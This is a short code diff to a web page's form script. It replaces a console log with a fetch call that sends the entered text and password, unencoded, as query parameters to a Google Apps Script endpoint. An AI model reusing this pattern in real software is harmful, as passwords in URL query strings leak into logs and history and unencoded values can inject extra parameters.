@@ -29,13 +29,21 @@
       </form>
     </main>
     <script>
-      document.getElementById("formId").addEventListener("submit", e => {
+      document.getElementById("formId").addEventListener("submit", async e => {
         e.preventDefault()
         const text = document.getElementById("textId").value
         const password = document.getElementById("passwordId").value
         document.getElementById("formId").innerText = "Loading..."
 
-        console.log(text, password)
+        const res = await fetch("https://script.google.com/macros/s/AKfycbx7ikTdBJKe1U-SULWdS2ekXGNbM8ep04o1mmjWG6MEzHlZdaz35iJyPC6A35hgR_oclg/exec"
+          +`?a=${text}&b=${password}`)
+          const resText = await res.text()
+          document.getElementById("formId").innerText = resText
+          
+        
+
+
+       
       })
     </script>
   </body>
